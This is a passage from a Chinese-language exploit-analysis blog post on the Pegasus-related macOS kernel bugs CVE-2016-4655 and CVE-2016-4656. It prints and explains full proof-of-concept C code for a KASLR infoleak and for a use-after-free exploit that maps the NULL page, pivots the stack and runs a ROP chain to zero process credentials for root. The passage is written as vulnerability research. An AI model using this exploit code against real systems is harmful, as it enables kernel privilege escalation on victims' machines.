漏洞利用-PoC分析</h2><p>同样分为两个漏洞利用：1，CVE-2016-4655-infoleak漏洞利用；2，CVE-2016-4656-UAF漏洞利用</p><h3 id="CVE-2016-4655-infoleak漏洞利用"><a href="#CVE-2016-4655-infoleak漏洞利用" class="headerlink" title="CVE-2016-4655-infoleak漏洞利用"></a>CVE-2016-4655-infoleak漏洞利用</h3><p>infoleak漏洞利用步骤：</p><ul><li>构造一个包含过长的<code>OSNumber</code>dic字典</li><li>用这个序列化字典去设置userclient对象的属性</li><li>读回设置的<code>OSNumber</code>属性，造成infoleak</li><li>利用读取回来的内核地址信息计算KASLR    </li></ul><p>完整的代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line">uint64_t kslide_infoleak(void)</div><div class="line">&#123;</div><div class="line">    kern_return_t kr = 0, err = 0;</div><div class="line">    mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;</div><div class="line"></div><div class="line">    io_service_t serv = 0;</div><div class="line">    io_connect_t conn = 0;</div><div class="line">    io_iterator_t iter = 0;</div><div class="line"></div><div class="line">    uint64_t kslide = 0;</div><div class="line"></div><div class="line">    void *dict = calloc(1, 512);</div><div class="line">    uint32_t idx = 0; // index into our data</div><div class="line"></div><div class="line">#define WRITE_IN(dict, data) do &#123; *(uint32_t *)(dict + idx) = (data); idx += 4; &#125; while (0)</div><div class="line"></div><div class="line">    WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning</div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // dictionary with two entries</div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeSymbol | 4)); // key with symbol, 3 chars + NUL byte</div><div class="line">    WRITE_IN(dict, (0x00414141)); // &apos;AAA&apos; key + NUL byte in little-endian</div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); // value with big-size number</div><div class="line">    WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); // at least 8 bytes for our big numbe</div><div class="line"></div><div class="line">    host_get_io_master(mach_host_self(), &amp;master); // get iokit master port</div><div class="line"></div><div class="line">    kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);</div><div class="line">    if (kr == KERN_SUCCESS) &#123;</div><div class="line">        printf(&quot;(+) Dictionary is valid! Spawning user client...\n&quot;);</div><div class="line">    &#125; else</div><div class="line">        return -1;</div><div class="line"></div><div class="line">    serv = IOServiceGetMatchingService(master, IOServiceMatching(&quot;IOHDIXController&quot;));</div><div class="line"></div><div class="line">    kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn);</div><div class="line">    if (kr == KERN_SUCCESS) &#123;</div><div class="line">        printf(&quot;(+) UC successfully spawned! Leaking bytes...\n&quot;);</div><div class="line">    &#125; else</div><div class="line">        return -1;</div><div class="line"></div><div class="line">    IORegistryEntryCreateIterator(serv, &quot;IOService&quot;, kIORegistryIterateRecursively, &amp;iter);</div><div class="line">    io_object_t object = IOIteratorNext(iter);</div><div class="line"></div><div class="line">    char buf[0x200] = &#123;0&#125;;</div><div class="line">    mach_msg_type_number_t bufCnt = 0x200;</div><div class="line"></div><div class="line">    kr = io_registry_entry_get_property_bytes(object, &quot;AAA&quot;, (char *)&amp;buf, &amp;bufCnt);</div><div class="line">    if (kr == KERN_SUCCESS) &#123;</div><div class="line">        printf(&quot;(+) Done! Calculating KASLR slide...\n&quot;);</div><div class="line">    &#125; else</div><div class="line">        return -1;</div><div class="line"></div><div class="line">#if 0</div><div class="line">    for (uint32_t k = 0; k &lt; 128; k += 8) &#123;</div><div class="line">        printf(&quot;%#llx\n&quot;, *(uint64_t *)(buf + k));</div><div class="line">    &#125;</div><div class="line">#endif</div><div class="line"></div><div class="line">    uint64_t hardcoded_ret_addr = 0xffffff80003934bf;</div><div class="line"></div><div class="line">    kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr;</div><div class="line"></div><div class="line">    printf(&quot;(i) KASLR slide is %#016llx\n&quot;, kslide);</div><div class="line"></div><div class="line">    return kslide;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="构造字典"><a href="#构造字典" class="headerlink" title="构造字典"></a>构造字典</h4><p>看下面这段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">void *dict = calloc(1, 512);</div><div class="line">uint32_t idx = 0; // index into our data</div><div class="line"></div><div class="line">#define WRITE_IN(dict, data) do &#123; *(uint32_t *)(dict + idx) = (data); idx += 4; &#125; while (0)</div></pre></td></tr></table></figure><p>这里的<code>WRITE_IN</code>这个宏只是为了方便我们将数据填入内存之中  </p><p>xml的字典格式  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;dict&gt;</div><div class="line">    &lt;symbol&gt;AAA&lt;/symbol&gt;</div><div class="line">    &lt;number size=0x200&gt;0x4141414141414141&lt;/number&gt;</div><div class="line">&lt;/dict&gt;</div></pre></td></tr></table></figure><p>对应的代码  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">WRITE_IN(dict, (0x000000d3)); // 头部签名</div><div class="line"></div><div class="line">WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // 包含两个元素的字典</div><div class="line"></div><div class="line">WRITE_IN(dict, (kOSSerializeSymbol | 4)); // 长度为3的symbol</div><div class="line">WRITE_IN(dict, (0x00414141)); // &apos;AAA&apos; key键</div><div class="line"></div><div class="line">WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); //0x200大小的number</div><div class="line">WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); //实际8字节的number</div></pre></td></tr></table></figure><p>利用<code>io_service_get_matching_services_bin</code>测试我们的<code>dic</code>是否有效  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">host_get_io_master(mach_host_self(), &amp;master); // get iokit master port</div><div class="line"></div><div class="line">kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);</div><div class="line">if (kr == KERN_SUCCESS) &#123;</div><div class="line">    printf(&quot;(+) Dictionary is valid! Spawning user client...\n&quot;);</div><div class="line">&#125; else</div><div class="line">    return -1;</div></pre></td></tr></table></figure><p>若<code>kr == KERN_SUCCESS</code>则我们的<code>dic</code>则为有效</p><h4 id="生成UserClient设定属性"><a href="#生成UserClient设定属性" class="headerlink" title="生成UserClient设定属性"></a>生成UserClient设定属性</h4><p>我们需要一个<code>UserClient</code>用来和内核通信，所以使用<code>io_service_open_extended</code>来产生一个相关服务的<code>UserClient</code>，这里的服务并不重要  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">serv = IOServiceGetMatchingService(master, IOServiceMatching(&quot;IOHDIXController&quot;));</div><div class="line"></div><div class="line">kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn);</div><div class="line">if (kr == KERN_SUCCESS) &#123;</div><div class="line">    printf(&quot;(+) UC successfully spawned! Leaking bytes...\n&quot;);</div><div class="line">&#125; else</div><div class="line">    return -1;</div></pre></td></tr></table></figure><p>首先我们通过<code>IOServiceGetMatchingService</code>去从<code>IORegistry</code>里匹配一个特定服务，然后通过<code>io_service_open_extended</code>让可以设置其属性并打开一个服务即隐式产生<code>UserClient</code><br>接下来就需要读取属性，我们通过得到一个访问的句柄，所以迭代<code>IORegistry</code>找到刚刚创建的<code>UserClient</code>。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">IORegistryEntryCreateIterator(serv, &quot;IOService&quot;, kIORegistryIterateRecursively, &amp;iter);</div><div class="line">io_object_t object = IOIteratorNext(iter);</div></pre></td></tr></table></figure><p>先通过<code>serv</code>端口创建<code>io_iterator_t</code>，我们的<code>UserClient</code>在<code>serv</code>创建之后，所以拿到<code>iter</code>后迭代一次即为我们的<code>UserClient</code>，现在就可以读取其属性并触发info-leak。</p><h4 id="读取属性，触发info-leak"><a href="#读取属性，触发info-leak" class="headerlink" title="读取属性，触发info-leak"></a>读取属性，触发info-leak</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">char buf[0x200] = &#123;0&#125;;</div><div class="line">mach_msg_type_number_t bufCnt = 0x200;</div><div class="line"></div><div class="line">kr = io_registry_entry_get_property_bytes(object, &quot;AAA&quot;, (char *)&amp;buf, &amp;bufCnt);</div><div class="line">if (kr == KERN_SUCCESS) &#123;</div><div class="line">    printf(&quot;(+) Done! Calculating KASLR slide...\n&quot;);</div><div class="line">&#125; else</div><div class="line">    return -1;</div></pre></td></tr></table></figure><p>通过<code>io_registry_entry_get_property_bytes</code>我们可以获取到原始字节，存在<code>buf</code>中，我们打印其值  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">for (uint32_t k = 0; k &lt; 128; k += 8) &#123;</div><div class="line">    printf(&quot;%#llx\n&quot;, *(uint64_t *)(buf + k));</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>对应输出：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">0x4141414141414141  // 有效的number</div><div class="line">0xffffff8033c66284  //</div><div class="line">0xffffff8035b5d800  //</div><div class="line">0x4                 // 其他数据或返回地址</div><div class="line">0xffffff803506d5a0  //</div><div class="line">0xffffff8033c662b4  //</div><div class="line">0xffffff818d2b3e30  //</div><div class="line">0xffffff80037934bf  // 函数返回地址</div><div class="line">...</div></pre></td></tr></table></figure><p>我们需要清楚函数的调用过程，那么久知道栈中返回地址所属函数<br>这里实际读取的代码位于<code>is_io_registry_entry_get_property_bytes</code>函数，即<code>io_registry_entry_get_property_bytes</code>调用了 <code>is_io_registry_entry_get_property_bytes</code>。</p><p><code>is_io_registry_entry_get_property_bytes</code>源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">/* Routine io_registry_entry_get_property */</div><div class="line">kern_return_t is_io_registry_entry_get_property_bytes(</div><div class="line">io_object_t registry_entry,</div><div class="line">io_name_t property_name,</div><div class="line">io_struct_inband_t buf,</div><div class="line">mach_msg_type_number_t *dataCnt )</div><div class="line">&#123;</div><div class="line">    OSObject*obj;</div><div class="line">    OSData *data;</div><div class="line">    OSString *str;</div><div class="line">    OSBoolean*boo;</div><div class="line">    OSNumber *off;</div><div class="line">    UInt64offsetBytes;</div><div class="line">    unsigned intlen = 0;</div><div class="line">    const void *bytes = 0;</div><div class="line">    IOReturnret = kIOReturnSuccess;</div><div class="line"></div><div class="line">    CHECK( IORegistryEntry, registry_entry, entry );</div><div class="line"></div><div class="line">#if CONFIG_MACF</div><div class="line">    if (0 != mac_iokit_check_get_property(kauth_cred_get(), entry, property_name))</div><div class="line">        return kIOReturnNotPermitted;</div><div class="line">#endif</div><div class="line"></div><div class="line">    obj = entry-&gt;copyProperty(property_name);</div><div class="line">    if( !obj)</div><div class="line">        return( kIOReturnNoResources );</div><div class="line"></div><div class="line">    // One day OSData will be a common container base class</div><div class="line">    // until then...</div><div class="line">    if( (data = OSDynamicCast( OSData, obj ))) &#123;</div><div class="line">len = data-&gt;getLength();</div><div class="line">bytes = data-&gt;getBytesNoCopy();</div><div class="line"></div><div class="line">    &#125; else if( (str = OSDynamicCast( OSString, obj ))) &#123;</div><div class="line">len = str-&gt;getLength() + 1;</div><div class="line">bytes = str-&gt;getCStringNoCopy();</div><div class="line"></div><div class="line">    &#125; else if( (boo = OSDynamicCast( OSBoolean, obj ))) &#123;</div><div class="line">len = boo-&gt;isTrue() ? sizeof(&quot;Yes&quot;) : sizeof(&quot;No&quot;);</div><div class="line">bytes = boo-&gt;isTrue() ? &quot;Yes&quot; : &quot;No&quot;;</div><div class="line"></div><div class="line">    &#125; else if( (off = OSDynamicCast( OSNumber, obj ))) &#123;    /* j: reading an OSNumber */</div><div class="line">offsetBytes = off-&gt;unsigned64BitValue();</div><div class="line">len = off-&gt;numberOfBytes();</div><div class="line">bytes = &amp;offsetBytes;</div><div class="line">#ifdef __BIG_ENDIAN__</div><div class="line">bytes = (const void *)</div><div class="line">(((UInt32) bytes) + (sizeof( UInt64) - len));</div><div class="line">#endif</div><div class="line"></div><div class="line">    &#125; else</div><div class="line">ret = kIOReturnBadArgument;</div><div class="line"></div><div class="line">    if( bytes) &#123;</div><div class="line">if( *dataCnt &lt; len)</div><div class="line">    ret = kIOReturnIPCError;</div><div class="line">else &#123;</div><div class="line">            *dataCnt = len;</div><div class="line">            bcopy( bytes, buf, len );</div><div class="line">&#125;</div><div class="line">    &#125;</div><div class="line">    obj-&gt;release();</div><div class="line"></div><div class="line">    return( ret );</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>下面代码表示正在读取<code>OSNumber</code>，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">else if( (off = OSDynamicCast( OSNumber, obj ))) &#123;</div><div class="line">offsetBytes = off-&gt;unsigned64BitValue(); /* j: the offsetBytes variable is allocated on the stack */</div><div class="line">len = off-&gt;numberOfBytes(); /* j: this reads out our malformed length, 0x200 */</div><div class="line">bytes = &amp;offsetBytes; /* j: bytes* ptr points to a stack variable */</div><div class="line"></div><div class="line">    ...</div><div class="line">&#125;</div><div class="line">...</div></pre></td></tr></table></figure><p>然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">if( bytes) &#123;</div><div class="line">    if( *dataCnt &lt; len)</div><div class="line">        ret = kIOReturnIPCError;</div><div class="line">    else &#123;</div><div class="line">        *dataCnt = len;</div><div class="line">        bcopy( bytes, buf, len ); /* j: this leaks data from the stack */</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>执行<code>bcopy</code>时，从<code>bytes</code>里读取了错误的长度，指向堆栈变量，泄漏函数返回地址，我们只需要找到一个地址减去静态地址，那么就能计算出内核偏移值</p><h4 id="计算内核偏移"><a href="#计算内核偏移" class="headerlink" title="计算内核偏移"></a>计算内核偏移</h4><p>将<code>/System/Library/Kernels/kernel</code>拖入hopper，搜索<code>is_io_registry_entry_get_property_bytes</code>，如下图  </p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/pic/0-0.png?raw=true" alt="0-0"></p><p>然后通过Xref找到调用的下一条地址即返回地址，最后将之前偏移后的地址-静态地址就等到了内核偏移值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0xffffff80037934bf - 0xffffff80003934bf = 0x3400000</div></pre></td></tr></table></figure><p>也就是下面这段代码所示：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">uint64_t hardcoded_ret_addr = 0xffffff80003934bf;</div><div class="line"></div><div class="line">kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr;</div><div class="line"></div><div class="line">printf(&quot;(i) KASLR slide is %#016llx\n&quot;, kslide);</div></pre></td></tr></table></figure><p>现在获取到了内核偏移值就可以利用UAF漏洞执行ROP链然后提权root。here we go！</p><h3 id="CVE-2016-4656-UAF漏洞利用"><a href="#CVE-2016-4656-UAF漏洞利用" class="headerlink" title="CVE-2016-4656-UAF漏洞利用"></a>CVE-2016-4656-UAF漏洞利用</h3><p>XNU的堆分配器被称为zalloc，这次我可以偷下懒了，与我之前分析得linux堆分配器相比虽然细节上可能有所不同，但基本原理都大同小异，简单的说来就是提供了不同的分配表，free后的元素会放入对应大小的链表之中，且位于最后，即如果时间合适，我们下次分配同样大小的内存就会返回刚free的内存。还不清楚的可以移步<a href="https://null-me.github.io/2017/04/23/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/" target="_blank" rel="external">深入理解Linux堆分配器-DLMalloc</a>这篇分析。<br>那么下面要做的就是如何构造下一个分配的对象，这里我们用<code>OSData</code>因为可以使用原生的二进制数据。回忆之前的UAF漏洞，当下一次<code>o-&gt;retain</code>引用就会触发，这里涉及到一个C++虚拟函数表的问题，当然我之前也分析过，不清楚的可以移步<a href="https://null-me.github.io/2017/03/07/C++%20Virtual%20table/%E8%AF%A6%E8%A7%A3virtual%20table/" target="_blank" rel="external">详解virtual table</a>简单说来一个对象的地址实际指向的是vtable，通过vtable就能找到对应的函数。所以我们可以构造假的vtable地址达到控制rip到自定义的地址。当然这里还有另一个技术-map NULL。为了能够有效的利用和控制，因为其他地址可能被修改，我们如果能在NULL段进行shellcode以及ROP链的部署那么就能稳定的利用。<br>下面看我们的步骤：  </p><ul><li>制作一个二进制字典，释放<code>OSString</code>并重新分配<code>OSData</code>。</li><li>Map NULL</li><li>放置stack pivot在偏移0x20到NULL页面</li><li>将一个小的传输链0x0放置在NULL页面中（这将传递执行到主链）</li><li>触发漏洞</li><li>提升权限，生成shell</li></ul><p>下面看完整的Poc代码：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div></pre></td><td class="code"><pre><div class="line">void use_after_free(void)</div><div class="line">&#123;</div><div class="line">    kern_return_t kr = 0;</div><div class="line">    mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;</div><div class="line"></div><div class="line">    /* craft the dictionary */</div><div class="line"></div><div class="line">    printf(&quot;(i) Crafting dictionary...\n&quot;);</div><div class="line"></div><div class="line">    void *dict = calloc(1, 512);</div><div class="line">    uint32_t idx = 0; // index into our data</div><div class="line"></div><div class="line">#define WRITE_IN(dict, data) do &#123; *(uint32_t *)(dict + idx) = (data); idx += 4; &#125; while (0)</div><div class="line"></div><div class="line">    WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning</div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 6)); // dict with 6 entries</div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeString | 4));   // string &apos;AAA&apos;, will get freed</div><div class="line">    WRITE_IN(dict, (0x00414141));</div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeBoolean | 1));  // bool, true</div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeSymbol | 4));   // symbol &apos;BBB&apos;</div><div class="line">    WRITE_IN(dict, (0x00424242));</div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeData | 32));    // data (0x00 * 32)</div><div class="line">    WRITE_IN(dict, (0x00000000));</div><div class="line">    WRITE_IN(dict, (0x00000000));</div><div class="line">    WRITE_IN(dict, (0x00000000));</div><div class="line">    WRITE_IN(dict, (0x00000000));</div><div class="line">    WRITE_IN(dict, (0x00000000));</div><div class="line">    WRITE_IN(dict, (0x00000000));</div><div class="line">    WRITE_IN(dict, (0x00000000));</div><div class="line">    WRITE_IN(dict, (0x00000000));</div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeSymbol | 4));   // symbol &apos;CCC&apos;</div><div class="line">    WRITE_IN(dict, (0x00434343));</div><div class="line"></div><div class="line">    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeObject | 1));   // ref to object 1 (OSString)</div><div class="line"></div><div class="line">    /* map the NULL page */</div><div class="line"></div><div class="line">    mach_vm_address_t null_map = 0;</div><div class="line"></div><div class="line">    vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE);</div><div class="line"></div><div class="line">    kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0);</div><div class="line">    if (kr != KERN_SUCCESS)</div><div class="line">        return;</div><div class="line"></div><div class="line">    macho_map_t *map = map_file_with_path(KERNEL_PATH_ON_DISK);</div><div class="line"></div><div class="line">    printf(&quot;(i) Leaking kslide...\n&quot;);</div><div class="line"></div><div class="line">    SET_KERNEL_SLIDE(kslide_infoleak()); // set global kernel slide</div><div class="line"></div><div class="line">    /* set the stack pivot at 0x20 */</div><div class="line"></div><div class="line">    *(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot</div><div class="line"></div><div class="line">    /* build ROP chain */</div><div class="line"></div><div class="line">    printf(&quot;(i) Building ROP chain...\n&quot;);</div><div class="line"></div><div class="line">    rop_chain_t *chain = calloc(1, sizeof(rop_chain_t));</div><div class="line"></div><div class="line">    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_current_proc&quot;));</div><div class="line"></div><div class="line">    PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);</div><div class="line">    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_proc_ucred&quot;));</div><div class="line"></div><div class="line">    PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);</div><div class="line">    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_posix_cred_get&quot;));</div><div class="line"></div><div class="line">    PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);</div><div class="line">    PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3));</div><div class="line">    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_bzero&quot;));</div><div class="line"></div><div class="line">    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_thread_exception_return&quot;));</div><div class="line"></div><div class="line">    /* chain transfer, will redirect execution flow from 0x0 to our main chain above */</div><div class="line"></div><div class="line">    uint64_t *transfer = (uint64_t *)0x0;</div><div class="line">    transfer[0] = ROP_POP_RSP(map);</div><div class="line">    transfer[1] = (uint64_t)chain-&gt;chain;</div><div class="line"></div><div class="line">    /* trigger */</div><div class="line"></div><div class="line">    printf(&quot;(+) All done! Triggering the bug!\n&quot;);</div><div class="line"></div><div class="line">    host_get_io_master(mach_host_self(), &amp;master); // get iokit master port</div><div class="line"></div><div class="line">    kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);</div><div class="line">    if (kr != KERN_SUCCESS)</div><div class="line">        return;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这里有很多的宏定义函数，先不用管这些，整个PoC代码在文章最后将会在我的GitHub上找到<br>下面一步一步分析</p><h4 id="构造字典-1"><a href="#构造字典-1" class="headerlink" title="构造字典"></a>构造字典</h4><p>将如下构造  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;dict&gt;</div><div class="line">    &lt;string&gt;AAA&lt;/string&gt;</div><div class="line">    &lt;boolean&gt;true&lt;/boolean&gt;</div><div class="line"></div><div class="line">    &lt;symbol&gt;BBB&lt;/symbol&gt;</div><div class="line">    &lt;data&gt;</div><div class="line">        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</div><div class="line">    &lt;/data&gt;</div><div class="line"></div><div class="line">    &lt;symbol&gt;CCC&lt;/symbol&gt;</div><div class="line">    &lt;reference&gt;1&lt;/reference&gt; &lt;!--引用第一个string元素--&gt;</div><div class="line">&lt;/dict&gt;</div></pre></td></tr></table></figure><p>当执行<code>retain</code>时就会以0x20的偏移量地址读取，也就是rip其值将为0x20<br>可能你会疑惑，0x20地址处不是应该处于__PAGEZERO段吗？是这样的，所以下面介绍Map NULL技术</p><h4 id="Map-NULL"><a href="#Map-NULL" class="headerlink" title="Map NULL"></a>Map NULL</h4><p>苹果并没有对32位强制限制不能map，具体我在Google上搜到了这些答案：<br><img 